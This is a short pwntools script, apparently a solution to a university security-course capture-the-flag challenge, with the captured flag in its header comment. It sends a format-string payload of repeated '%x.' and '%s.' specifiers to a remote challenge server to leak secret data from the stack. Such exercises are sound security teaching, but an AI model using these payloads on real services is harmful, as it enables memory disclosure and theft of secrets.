# SSof{No_Secrets_in_stack}
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22190

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
# s = process('./check', shell=True)


### interact with it

# msg = "%x.%x.%x.%x.%x.%x.%x."
# msg = b"%s."*8
# msg = b"%x."*7

msg = b"%x."*6
msg += b"%s."

print(msg)
# s.send(msg + b'\n')
s.sendline(msg)

print(s.recv())
# s.recvall()
# s.interactive()

